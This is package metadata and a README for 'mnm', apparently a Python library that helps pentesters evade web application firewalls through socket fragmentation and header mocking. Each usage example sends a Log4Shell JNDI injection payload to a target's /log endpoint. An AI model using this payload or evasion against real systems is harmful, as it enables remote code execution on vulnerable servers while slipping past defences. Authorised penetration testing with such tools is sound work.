@@ -1,0 +1,55 @@
+Metadata-Version: 2.1
+Name: mnm
+Version: 0.3.0
+Summary: A simple python library for pentesting firewall protected webapp
+Author-email: ohk990102 <ohk990102@gmail.com>
+Project-URL: Homepage, https://github.com/ohk990102/mnm
+Project-URL: Bug Tracker, https://github.com/ohk990102/mnm/issues
+Classifier: Programming Language :: Python :: 3
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Operating System :: POSIX :: Linux
+Description-Content-Type: text/markdown
+License-File: LICENSE
+Requires-Dist: requests >=2.26.0
+
+# mnm
+
+This is a simple python library for pentesting firewall protected webapp.
+
+## Installation
+
+```bash
+pip install mnm
+```
+
+## Usage
+
+```python
+from mnm import *
+import requests
+
+@mixed(SocketFragmentation(slice=5), HeaderMocking())
+def mixed_options(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
+
+@mixed()
+def mixed_simple(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
+
+def with_pattern(ip):
+    with SocketFragmentation(slice=5), HeaderMocking():
+        r = requests.get(f'http://{ip}/log', data={
+            "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+        })
+        print(r.text)
+```
+
+## License
+
+MIT License
